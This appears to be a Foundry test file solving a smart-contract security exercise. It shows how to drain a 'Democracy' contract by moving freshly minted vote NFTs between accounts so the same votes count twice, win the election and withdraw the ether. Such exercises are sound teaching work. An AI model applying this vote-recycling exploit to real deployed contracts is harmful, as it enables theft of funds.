// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "week10-11-security2/Democracy.sol";

contract DemocracyTest is Test {
    Democracy democracy;

    function setUp() external {
        democracy = new Democracy{value: 1 ether}();
    }

    function test_setUp() external {
        assertEq(address(democracy).balance, 1 ether);
    }

    function test_attack() external {
        address challenger = makeAddr("challenger");
        address friend = makeAddr("friend");
        console.log("challenger.balance", challenger.balance);

        // In order to simulate EOA, must make both msg.sender and tx.origin the
        // same address
        vm.startPrank(challenger, challenger);

        // Nominate challenger, which will mint 2 tokens for challenger
        democracy.nominateChallenger(challenger);

        // Transfer first NFT, so that challenger only gets one vote, so that
        // election will not yet be called
        democracy.transferFrom(challenger, friend, 0);

        // Vote as challenger
        democracy.vote(challenger);

        // Transfer second NFT, so that friend can vote twice
        democracy.transferFrom(challenger, friend, 1);

        vm.stopPrank();

        // Vote as friend, votes twice to break the tie
        vm.prank(friend);
        democracy.vote(challenger);

        // Withdraw the balance, since challenger won the vote
        vm.prank(challenger);
        democracy.withdrawToAddress(challenger);

        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(address(democracy).balance, 0);
    }
}
